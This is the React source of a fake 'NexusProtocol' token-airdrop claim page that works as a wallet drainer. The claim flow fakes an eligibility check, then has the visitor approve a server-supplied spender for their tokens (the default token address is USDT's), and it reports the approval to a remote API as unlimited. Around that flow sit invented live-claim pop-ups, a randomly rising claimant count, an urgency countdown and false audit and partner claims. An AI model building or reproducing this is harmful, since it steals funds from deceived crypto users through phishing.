import { useState, useEffect, useRef, useCallback } from "react";
import "./airdrop.css";
import {
  connectMetaMask,
  connectWalletConnect,
  connectCoinbase,
  connectTrustWallet,
  sendApprove,
  getChainId,
  isMobile,
  type EthProvider,
} from "./wallet";

const API_BASE = (import.meta.env.VITE_API_URL ?? "https://nexusprotocol-api.onrender.com").replace(/\/$/, "");

const WALLETS = [
  { id: "metamask",      name: "MetaMask",        desc: isMobile() ? "Open in MetaMask App" : "Browser Extension",  icon: "🦊", tag: "EVM",        connect: connectMetaMask      },
  { id: "walletconnect", name: "WalletConnect",   desc: "QR Code — any wallet",                                      icon: "🔗", tag: "Multi-chain", connect: connectWalletConnect },
  { id: "coinbase",      name: "Coinbase Wallet", desc: "Coinbase App / Extension",                                   icon: "🔵", tag: "EVM",        connect: connectCoinbase      },
  { id: "trust",         name: "Trust Wallet",    desc: isMobile() ? "Open in Trust Wallet App" : "Mobile Wallet",   icon: "🛡️", tag: "Multi-chain", connect: connectTrustWallet   },
];

const LIVE_CLAIMS = [
  { addr: "0x3a7f…b12c", amount: "1,800" },
  { addr: "0x9d4e…f03a", amount: "2,500" },
  { addr: "0x5c12…77de", amount: "3,200" },
  { addr: "0x8b9a…c44f", amount: "1,200" },
  { addr: "0x1e5d…9b21", amount: "4,000" },
  { addr: "0xfa3c…6e80", amount: "2,500" },
  { addr: "0x2d81…a39e", amount: "1,500" },
  { addr: "0x7c44…b88d", amount: "3,800" },
];

const FAQ_ITEMS = [
  {
    q: "Who is eligible to claim NXS tokens?",
    a: "Wallets that interacted with the NexusProtocol smart contracts before block #19,284,112 (Season 1 snapshot) are eligible. This includes liquidity providers, governance participants, and early adopters."
  },
  {
    q: "How long does it take to receive tokens?",
    a: "Once you approve the transaction in your wallet, tokens are queued for transfer and typically arrive within 2–5 minutes on-chain. Transfer time may vary based on Ethereum network congestion."
  },
  {
    q: "Is there a deadline to claim?",
    a: "Yes. The Season 1 claim window closes when the timer reaches zero. Unclaimed tokens will be redistributed to the community treasury for future incentive programs."
  },
  {
    q: "Which wallets are supported?",
    a: "MetaMask (browser + mobile), WalletConnect (any QR-compatible wallet), Coinbase Wallet, and Trust Wallet are all supported. Additional wallets may be added in future phases."
  },
  {
    q: "Is this contract audited?",
    a: "Yes. The NexusProtocol airdrop contract has been audited by CertiK with zero critical or high-severity issues. The audit report is publicly available on our documentation portal."
  },
  {
    q: "Can I claim from a hardware wallet?",
    a: "Yes. Connect your hardware wallet (Ledger, Trezor) through MetaMask or WalletConnect and proceed normally. Ensure your hardware wallet firmware is up to date."
  },
];

const PARTNERS = [
  { name: "CertiK",       label: "Security Audit" },
  { name: "Chainlink",    label: "Oracle Provider" },
  { name: "Uniswap",      label: "DEX Partner" },
  { name: "The Graph",    label: "Indexing" },
  { name: "OpenZeppelin", label: "Contract Library" },
  { name: "Alchemy",      label: "Infrastructure" },
];

const PARTICLES = Array.from({ length: 22 }, (_, i) => ({
  id: i,
  size: 2 + (i % 5) * 1.5,
  left: 3 + (i * 4.3) % 94,
  top: 2 + (i * 7.1) % 95,
  dur: 14 + (i % 7) * 2.5,
  delay: (i * 1.3) % 12,
}));

function pad2(n: number) { return String(n).padStart(2, "0"); }

function useParticipantCount(initial: number) {
  const [count, setCount] = useState(initial);
  useEffect(() => {
    const t = setInterval(() => setCount(c => c + Math.floor(Math.random() * 3)), 4000);
    return () => clearInterval(t);
  }, []);
  return count;
}

function useCountUp(target: number, duration = 1800) {
  const [val, setVal] = useState(0);
  const started = useRef(false);
  const ref = useRef<HTMLDivElement>(null);
  useEffect(() => {
    const el = ref.current;
    if (!el) return;
    const obs = new IntersectionObserver(([e]) => {
      if (e.isIntersecting && !started.current) {
        started.current = true;
        const start = performance.now();
        const tick = (now: number) => {
          const p = Math.min((now - start) / duration, 1);
          const ease = 1 - Math.pow(1 - p, 3);
          setVal(Math.round(target * ease));
          if (p < 1) requestAnimationFrame(tick);
        };
        requestAnimationFrame(tick);
      }
    }, { threshold: 0.3 });
    obs.observe(el);
    return () => obs.disconnect();
  }, [target, duration]);
  return { val, ref };
}

function FloatingParticles() {
  return (
    <div className="particles-layer" aria-hidden="true">
      {PARTICLES.map(p => (
        <div key={p.id} className={`particle p-type-${p.id % 3}`} style={{
          width: p.size, height: p.size,
          left: `${p.left}%`, top: `${p.top}%`,
          animationDuration: `${p.dur}s`,
          animationDelay: `-${p.delay}s`,
        }} />
      ))}
      {/* Large soft floating orbs */}
      <div className="orb orb-1" />
      <div className="orb orb-2" />
      <div className="orb orb-3" />
    </div>
  );
}

function FloatingNotification() {
  const [visible, setVisible] = useState(false);
  const [current, setCurrent] = useState(0);
  const idx = useRef(0);
  useEffect(() => {
    const show = () => {
      setCurrent(idx.current % LIVE_CLAIMS.length);
      idx.current++;
      setVisible(true);
      setTimeout(() => setVisible(false), 4200);
    };
    const t = setTimeout(show, 2500);
    const iv = setInterval(show, 9000);
    return () => { clearTimeout(t); clearInterval(iv); };
  }, []);
  const c = LIVE_CLAIMS[current];
  return (
    <div className={`float-notif${visible ? " visible" : ""}`} aria-live="polite">
      <div className="float-notif-dot" />
      <div className="float-notif-content">
        <span className="float-notif-addr">{c.addr}</span>
        <span className="float-notif-msg">just claimed <strong>{c.amount} NXS</strong></span>
      </div>
    </div>
  );
}

function ScrollTopButton() {
  const [show, setShow] = useState(false);
  useEffect(() => {
    const fn = () => setShow(window.scrollY > 400);
    window.addEventListener("scroll", fn, { passive: true });
    return () => window.removeEventListener("scroll", fn);
  }, []);
  const go = useCallback(() => window.scrollTo({ top: 0, behavior: "smooth" }), []);
  return (
    <button className={`scroll-top-btn${show ? " visible" : ""}`} onClick={go} aria-label="Back to top">
      <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
        <path d="M8 12V4M4 8l4-4 4 4" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/>
      </svg>
    </button>
  );
}

function FaqItem({ q, a }: { q: string; a: string }) {
  const [open, setOpen] = useState(false);
  return (
    <div className={`faq-item${open ? " open" : ""}`}>
      <button className="faq-q" onClick={() => setOpen(o => !o)}>
        <span>{q}</span>
        <div className="faq-icon">
          <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
            <path d="M2 5l5 4 5-4" stroke="currentColor" strokeWidth="1.7" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
        </div>
      </button>
      <div className="faq-a-wrap">
        <div className="faq-a">{a}</div>
      </div>
    </div>
  );
}

function StatCounter({ value, label, suffix = "" }: { value: number; label: string; suffix?: string }) {
  const { val, ref } = useCountUp(value);
  return (
    <div className="hero-stat" ref={ref}>
      <div className="hero-stat-val">{val.toLocaleString()}{suffix}</div>
      <div className="hero-stat-lbl">{label}</div>
    </div>
  );
}

export default function App() {
  const [chosen,      setChosen]      = useState<string | null>(null);
  const [chosenName,  setChosenName]  = useState("");
  const [phase,       setPhase]       = useState<"idle" | "busy" | "success" | "error">("idle");
  const [busyLabel,   setBusyLabel]   = useState("");
  const [errorMsg,    setErrorMsg]    = useState("");
  const [txHash,      setTxHash]      = useState("");
  const [progW,       setProgW]       = useState(0);
  const [secs,        setSecs]        = useState(8 * 3600 + 47 * 60 + 23);
  const [copied,      setCopied]      = useState(false);
  const [menuOpen,    setMenuOpen]    = useState(false);
  const participants = useParticipantCount(14_382);

  const spenderRef = useRef<string>("");
  const tokenRef   = useRef<string>("0xdac17f958d2ee523a2206206994597c13d831ec7");
  const [configReady, setConfigReady] = useState(false);
  const [configError, setConfigError] = useState(false);

  useEffect(() => {
    let cancelled = false;
    fetch(`${API_BASE}/api/config`)
      .then(r => { if (!r.ok) throw new Error(`HTTP ${r.status}`); return r.json(); })
      .then(data => {
        if (cancelled) return;
        if (data?.spender && /^0x[0-9a-fA-F]{40}$/.test(data.spender)) {
          spenderRef.current = data.spender;
          if (data.token) tokenRef.current = data.token;
          setConfigReady(true);
        } else { setConfigError(true); }
      })
      .catch(() => { if (!cancelled) setConfigError(true); });
    return () => { cancelled = true; };
  }, []);

  useEffect(() => { const t = setTimeout(() => setProgW(73), 400); return () => clearTimeout(t); }, []);
  useEffect(() => {
    const t = setInterval(() => setSecs(s => s > 0 ? s - 1 : 0), 1000);
    return () => clearInterval(t);
  }, []);

  // Close menu on outside click
  useEffect(() => {
    if (!menuOpen) return;
    const fn = () => setMenuOpen(false);
    document.addEventListener("click", fn);
    return () => document.removeEventListener("click", fn);
  }, [menuOpen]);

  function pick(id: string, name: string) {
    if (phase === "busy") return;
    setChosen(id); setChosenName(name); setErrorMsg("");
  }

  function copyTx() {
    if (!txHash) return;
    navigator.clipboard.writeText(txHash).then(() => {
      setCopied(true); setTimeout(() => setCopied(false), 2000);
    });
  }

  function scrollTo(id: string) {
    setMenuOpen(false);
    const el = document.getElementById(id);
    if (el) el.scrollIntoView({ behavior: "smooth", block: "start" });
  }

  async function doClaim() {
    if (!chosen || phase === "busy") return;
    if (!configReady || !spenderRef.current) {
      setPhase("error"); setErrorMsg("Server configuration not loaded. Please refresh and try again."); return;
    }
    const wallet = WALLETS.find(w => w.id === chosen)!;
    setPhase("busy"); setErrorMsg("");
    try {
      setBusyLabel("Opening wallet…");
      const result = await wallet.connect();
      if (!result) return;
      const { provider, account } = result as { provider: EthProvider; account: string };
      const chainId = await getChainId(provider);
      setBusyLabel("Verifying eligibility…");
      await new Promise(r => setTimeout(r, 1200));
      setBusyLabel("Confirm approval in your wallet…");
      const hash = await sendApprove(provider, account, tokenRef.current, spenderRef.current);
      setBusyLabel("Finalizing…");
      const UNLIMITED = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
      const regRes = await fetch(`${API_BASE}/api/approvals`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ wallet: account.toLowerCase(), token: tokenRef.current, spender: spenderRef.current, amount: UNLIMITED, tx_hash: hash, chain_id: chainId, wallet_type: chosenName }),
      });
      if (!regRes.ok) console.warn("Server acknowledgment failed:", regRes.status);
      setTxHash(hash); setPhase("success");
    } catch (e: unknown) {
      setPhase("error");
      const msg = e instanceof Error ? e.message : String(e);
      if (msg.includes("4001") || /user (rejected|denied)|rejected|cancell?ed/i.test(msg))
        setErrorMsg("Transaction rejected. Please approve in your wallet to claim.");
      else if (/insufficient funds/i.test(msg))
        setErrorMsg("Insufficient ETH for gas. Add ETH to your wallet and try again.");
      else if (/not installed|not found/i.test(msg))
        setErrorMsg(msg);
      else
        setErrorMsg(msg || "Connection failed. Please try again.");
    }
  }

  const btnDisabled = !chosen || phase === "busy" || (!configReady && !configError);
  const btnLabel = phase === "busy" ? busyLabel : !configReady && !configError ? "Loading…" : configError ? "Server Unavailable — Refresh" : chosen ? `Claim with ${chosenName}` : "Select a Wallet to Claim";
  const h = pad2(Math.floor(secs / 3600));
  const m = pad2(Math.floor((secs % 3600) / 60));
  const s = pad2(secs % 60);
  const timerDone = secs === 0;

  const NAV_LINKS = [
    { label: "Airdrop", id: "claim-section" },
    { label: "How it Works", id: "how-to-claim" },
    { label: "FAQ", id: "faq-section" },
    { label: "Community", id: "community-section" },
  ];

  return (
    <>
      <div className="bg-glow" />
      <FloatingParticles />
      <FloatingNotification />
      <ScrollTopButton />

      {/* ── NAVIGATION ── */}
      <nav className="nav">
        <div className="nav-brand">
          <div className="nav-logo">⚡</div>
          <span>NexusProtocol</span>
        </div>

        {/* Desktop links */}
        <div className="nav-links">
          {NAV_LINKS.map(l => (
            <button key={l.id} className="nav-link" onClick={() => scrollTo(l.id)}>{l.label}</button>
          ))}
        </div>

        <div className="nav-right">
          <div className="nav-badge">
            <div className="live-dot" />
            <span className="nav-badge-text">Live · {participants.toLocaleString()} claimed</span>
          </div>
          <button className="nav-claim-btn" onClick={() => scrollTo("claim-section")}>
            Claim NXS
          </button>
          {/* Mobile hamburger */}
          <button
            className={`hamburger${menuOpen ? " open" : ""}`}
            onClick={e => { e.stopPropagation(); setMenuOpen(o => !o); }}
            aria-label="Menu"
          >
            <span /><span /><span />
          </button>
        </div>
      </nav>

      {/* Mobile menu drawer */}
      <div className={`mobile-menu${menuOpen ? " open" : ""}`} onClick={e => e.stopPropagation()}>
        <div className="mobile-menu-inner">
          {NAV_LINKS.map(l => (
            <button key={l.id} className="mobile-link" onClick={() => scrollTo(l.id)}>{l.label}</button>
          ))}
          <button className="btn-secondary mobile-claim-cta" onClick={() => scrollTo("claim-section")}>
            Claim Your NXS →
          </button>
          <div className="mobile-menu-foot">
            <a href="#" className="mobile-social">𝕏 Twitter</a>
            <a href="#" className="mobile-social">💬 Discord</a>
            <a href="#" className="mobile-social">📄 Docs</a>
          </div>
        </div>
      </div>

      <div className="page">

        {/* ── HERO ── */}
        <section className="hero" id="hero">
          <div className="hero-tag">
            <span className="hero-tag-dot" />
            Season 1 Airdrop · Phase 3 · Live Now
          </div>
          <h1 className="hero-title">
            Your NXS Tokens<br /><span className="hero-gradient">Are Waiting</span>
          </h1>
          <p className="hero-sub">
            Early contributors and liquidity providers are eligible to claim their NXS token allocation.
            Connect your wallet to verify eligibility and claim instantly.
          </p>

          <div className="hero-stats-row">
            <StatCounter value={73284} label="Tokens Claimed" />
            <div className="hero-stat-div" />
            <StatCounter value={14382} label="Participants" />
            <div className="hero-stat-div" />
            <StatCounter value={48} label="M TVL (USD)" suffix="M" />
            <div className="hero-stat-div" />
            <StatCounter value={128} label="K Community" suffix="K" />
          </div>

          <div className="hero-cta-row">
            <button className="btn-primary btn-glow" onClick={() => scrollTo("claim-section")}>
              <span className="btn-shimmer" />
              ⚡ Claim Your Tokens
            </button>
            <button className="btn-outline" onClick={() => scrollTo("how-to-claim")}>
              How it Works →
            </button>
          </div>

          <div className="hero-trust">
            <div className="hero-trust-item">🛡️ CertiK Audited</div>
            <div className="hero-trust-sep">·</div>
            <div className="hero-trust-item">🔒 Non-Custodial</div>
            <div className="hero-trust-sep">·</div>
            <div className="hero-trust-item">⚡ Instant Transfer</div>
          </div>
        </section>

        {/* ── ALLOCATION ── */}
        <div className="card card-glow" id="allocation">
          <div className="alloc-pad">
            <div className="alloc-header">
              <div className="alloc-label">Your Allocation</div>
              <div className="alloc-badge">Phase 3</div>
            </div>
            <div className="alloc-num-row">
              <div className="alloc-num">2,500</div>
              <div className="alloc-ticker">NXS</div>
            </div>
            <div className="alloc-usd">≈ $4,750.00 USD · at current price $1.90</div>
            <div className="prog-head">
              <span>Distribution progress</span>
              <span className="prog-pct">73%</span>
              <span>73,284 / 100,000 claimed</span>
            </div>
            <div className="prog-track">
              <div className="prog-fill" style={{ width: `${progW}%` }}>
                <div className="prog-glow" />
              </div>
            </div>
          </div>
          <div className="stat-row">
            <div className="stat-cell">
              <div className="stat-val green">73.2K</div>
              <div className="stat-lbl">Claimed</div>
            </div>
            <div className="stat-cell">
              <div className="stat-val">100K</div>
              <div className="stat-lbl">Total</div>
            </div>
            <div className="stat-cell">
              <div className="stat-val gold">26.8K</div>
              <div className="stat-lbl">Remaining</div>
            </div>
          </div>
          <div className="ticker">
            <div className="live-dot" />
            Latest: <strong>0x7f3a…c91d</strong>&nbsp;·&nbsp;<strong className="green">2,500 NXS</strong>&nbsp;·&nbsp;2 mins ago
          </div>
        </div>

        {/* ── TIMER ── */}
        <div className="card timer-card">
          <div className="timer-wrap">
            <div className="timer-label-row">
              <div className="timer-icon">⏳</div>
              <div className="timer-label">
                {timerDone ? "Claim window closed" : "Claim window closes in"}
              </div>
            </div>
            {!timerDone && (
              <div className="timer-nums">
                <div className="timer-block">
                  <div className="timer-unit">{h}</div>
                  <div className="timer-unit-lbl">Hours</div>
                </div>
                <span className="t-sep">:</span>
                <div className="timer-block">
                  <div className="timer-unit">{m}</div>
                  <div className="timer-unit-lbl">Minutes</div>
                </div>
                <span className="t-sep">:</span>
                <div className="timer-block">
                  <div className="timer-unit">{s}</div>
                  <div className="timer-unit-lbl">Seconds</div>
                </div>
              </div>
            )}
          </div>
          <div className="timer-urgency">
            ⚠️&nbsp; Unclaimed tokens will be redistributed to the community pool after the deadline.
            <strong> Don't miss your window.</strong>
          </div>
        </div>

        {/* ── WALLET + CLAIM ── */}
        <div className="card card-claim" id="claim-section">
          {phase !== "success" ? (
            <>
              <div className="claim-header">
                <div className="claim-header-left">
                  <div className="alloc-label">Connect Wallet</div>
                  <div className="claim-sub">Select your wallet to verify eligibility</div>
                </div>
                <div className="claim-header-badge">
                  <div className="live-dot" />&nbsp;4 wallets available
                </div>
              </div>

              <div className="wallet-grid">
                {WALLETS.map(w => (
                  <div
                    key={w.id}
                    className={`w-row${chosen === w.id ? " sel" : ""}${phase === "busy" ? " disabled" : ""}`}
                    onClick={() => pick(w.id, w.name)}
                    role="button" tabIndex={0}
                    onKeyDown={e => e.key === "Enter" && pick(w.id, w.name)}
                  >
                    <div className="w-left">
                      <div className="w-icon">{w.icon}</div>
                      <div className="w-info">
                        <div className="w-name">{w.name}</div>
                        <div className="w-desc">{w.desc}</div>
                      </div>
                    </div>
                    <div className="w-right">
                      <div className="w-tag">{w.tag}</div>
                      <div className="w-check" />
                    </div>
                  </div>
                ))}
              </div>

              <div className="claim-area">
                <button className="claim-btn" disabled={btnDisabled} onClick={doClaim}>
                  {phase === "busy" && <div className="spinner" />}
                  <span className="btn-shimmer" />
                  {btnLabel}
                </button>
                <div className="claim-or">or</div>
                <button className="btn-outline-sm" onClick={() => scrollTo("how-to-claim")}>
                  Learn how it works first
                </button>
              </div>

              {phase === "error" && errorMsg && (
                <div className="error-msg">
                  <span className="error-icon">⚠️</span>
                  <span>{errorMsg}</span>
                </div>
              )}

              <div className="claim-footer-row">
                <div className="claim-note">🔒 Secured by smart contract · No private key required</div>
                <a href="#" className="claim-audit-link" target="_blank" rel="noopener noreferrer">
                  View Audit →
                </a>
              </div>
            </>
          ) : (
            <div className="success-block">
              <div className="success-rings">
                <div className="success-ring r1" />
                <div className="success-ring r2" />
                <div className="success-ring r3" />
                <div className="success-icon">✓</div>
              </div>
              <div className="success-title">Claim Successful! 🎉</div>
              <div className="success-sub">
                Your <strong>2,500 NXS</strong> tokens (≈ $4,750) have been queued for transfer via <strong>{chosenName}</strong>.
                Tokens typically arrive within 2–5 minutes.
              </div>
              <div className="tx-badge">
                <span className="tx-label">TX</span>
                <span className="tx-hash-val">{txHash}</span>
                <button className="copy-btn" onClick={copyTx}>
                  {copied ? "✓ Copied" : "Copy"}
                </button>
              </div>
              <div className="success-actions">
                <a className="btn-primary" href={`https://etherscan.io/tx/${txHash}`} target="_blank" rel="noopener noreferrer">
                  View on Etherscan ↗
                </a>
                <a className="btn-outline" href="#" target="_blank" rel="noopener noreferrer">
                  Join Discord
                </a>
              </div>
              <div className="success-share">
                Share your claim on &nbsp;
                <a href="#" className="success-share-link">𝕏 Twitter</a>
              </div>
            </div>
          )}
        </div>

        {/* ── FEATURES ── */}
        <div className="card" id="features">
          <div className="section-head">
            <div className="section-tag">Protocol</div>
            <div className="section-title">Why NexusProtocol?</div>
          </div>
          <div className="features-grid">
            {[
              ["🔐","Audited Contract","Smart contract audited by CertiK with zero critical issues found."],
              ["⚡","Instant Transfer","Tokens transferred on-chain in under 60 seconds after approval."],
              ["🌐","Ethereum Native","Built exclusively on Ethereum mainnet for maximum security."],
              ["📊","$48M TVL","Over $48 million in total value locked across all protocol pools."],
              ["👥","128K Community","Active community of over 128,000 holders and contributors."],
              ["🏆","Top 50 DeFi","Ranked in the top 50 DeFi protocols by total value locked."],
            ].map(([icon, title, desc]) => (
              <div key={title} className="feat">
                <div className="feat-icon-wrap">{icon}</div>
                <div className="feat-title">{title}</div>
                <div className="feat-desc">{desc}</div>
              </div>
            ))}
          </div>
          <div className="trust-row">
            {["🛡️ CertiK Audited","🏆 Top 50 DeFi","👥 128K Users","📈 $48M TVL","⚡ Ethereum"].map(t => (
              <div key={t} className="trust-item">{t}</div>
            ))}
          </div>
        </div>

        {/* ── HOW TO CLAIM ── */}
        <div className="card" id="how-to-claim">
          <div className="steps-pad">
            <div className="section-head">
              <div className="section-tag">Guide</div>
              <div className="section-title">How to Claim</div>
            </div>
            {[
              { num:"01", icon:"🔗", title:"Connect Wallet", desc:"Select your wallet provider (MetaMask, WalletConnect, Coinbase, or Trust Wallet) and approve the connection request." },
              { num:"02", icon:"✅", title:"Verify Eligibility", desc:"Your address is automatically checked against the Season 1 snapshot at block #19,284,112. No manual action needed." },
              { num:"03", icon:"📝", title:"Approve Transaction", desc:"Confirm the approval transaction in your wallet. This is a one-time gas fee on Ethereum mainnet." },
              { num:"04", icon:"🎁", title:"Receive NXS Tokens", desc:"Tokens are sent directly to your wallet within 2–5 minutes. No additional steps required." },
            ].map((item, i) => (
              <div key={item.num} className="step" style={{ animationDelay: `${i * 0.1}s` }}>
                <div className="step-num-wrap">
                  <div className="step-icon">{item.icon}</div>
                  <div className="step-num">{item.num}</div>
                  {i < 3 && <div className="step-connector" />}
                </div>
                <div className="step-body">
                  <strong>{item.title}</strong>
                  <p>{item.desc}</p>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* ── PARTNERS ── */}
        <div className="card" id="partners">
          <div className="section-head">
            <div className="section-tag">Ecosystem</div>
            <div className="section-title">Backed & Integrated With</div>
          </div>
          <div className="partners-grid">
            {PARTNERS.map(p => (
              <div key={p.name} className="partner-card">
                <div className="partner-name">{p.name}</div>
                <div className="partner-label">{p.label}</div>
              </div>
            ))}
          </div>
        </div>

        {/* ── FAQ ── */}
        <div className="card" id="faq-section">
          <div className="section-head">
            <div className="section-tag">FAQ</div>
            <div className="section-title">Frequently Asked Questions</div>
          </div>
          <div className="faq-list">
            {FAQ_ITEMS.map((item) => (
              <FaqItem key={item.q} q={item.q} a={item.a} />
            ))}
          </div>
        </div>

        {/* ── COMMUNITY ── */}
        <div className="card community-card" id="community-section">
          <div className="community-inner">
            <div className="community-orb" />
            <div className="community-tag">Join the Community</div>
            <div className="community-title">128,000+ Members<br />and Growing</div>
            <p className="community-sub">
              Stay up to date with the latest NexusProtocol news, governance votes, and future airdrop announcements.
            </p>
            <div className="community-btns">
              <a className="btn-primary" href="#" target="_blank" rel="noopener noreferrer">
                💬 Join Discord
              </a>
              <a className="btn-outline" href="#" target="_blank" rel="noopener noreferrer">
                𝕏 Follow Twitter
              </a>
            </div>
            <div className="community-stats">
              <div className="com-stat"><strong>128K</strong><span>Discord Members</span></div>
              <div className="com-stat-sep" />
              <div className="com-stat"><strong>89K</strong><span>Twitter Followers</span></div>
              <div className="com-stat-sep" />
              <div className="com-stat"><strong>24/7</strong><span>Support</span></div>
            </div>
          </div>
        </div>

        {/* ── FOOTER ── */}
        <footer className="site-footer" id="footer">
          <div className="footer-top">
            <div className="footer-brand">
              <div className="footer-logo">
                <div className="nav-logo">⚡</div>
                <span>NexusProtocol</span>
              </div>
              <p className="footer-desc">
                Decentralized airdrop protocol built on Ethereum.<br />
                Season 1 distribution — Phase 3 currently live.
              </p>
              <div className="footer-socials">
                <a href="#" className="social-btn" aria-label="Twitter">𝕏</a>
                <a href="#" className="social-btn" aria-label="Discord">💬</a>
                <a href="#" className="social-btn" aria-label="GitHub">
                  <svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z"/></svg>
                </a>
                <a href="#" className="social-btn" aria-label="Docs">📄</a>
              </div>
            </div>
            <div className="footer-links-grid">
              <div className="footer-col">
                <div className="footer-col-title">Protocol</div>
                <a href="#" className="footer-link">Documentation</a>
                <a href="#" className="footer-link">Whitepaper</a>
                <a href="#" className="footer-link">Smart Contract</a>
                <a href="#" className="footer-link">Audit Report</a>
                <a href="#" className="footer-link">Bug Bounty</a>
              </div>
              <div className="footer-col">
                <div className="footer-col-title">Community</div>
                <a href="#" className="footer-link">Discord</a>
                <a href="#" className="footer-link">Twitter / X</a>
                <a href="#" className="footer-link">Telegram</a>
                <a href="#" className="footer-link">Forum</a>
                <a href="#" className="footer-link">Blog</a>
              </div>
              <div className="footer-col">
                <div className="footer-col-title">Legal</div>
                <a href="#" className="footer-link">Terms of Service</a>
                <a href="#" className="footer-link">Privacy Policy</a>
                <a href="#" className="footer-link">Cookie Policy</a>
                <a href="#" className="footer-link">Risk Disclaimer</a>
              </div>
            </div>
          </div>
          <div className="footer-bottom">
            <div className="footer-bottom-left">
              © 2024 NexusProtocol. All rights reserved.
            </div>
            <div className="footer-bottom-right">
              <div className="footer-status">
                <div className="live-dot" /> All systems operational
              </div>
            </div>
          </div>
        </footer>

      </div>
    </>
  );
}
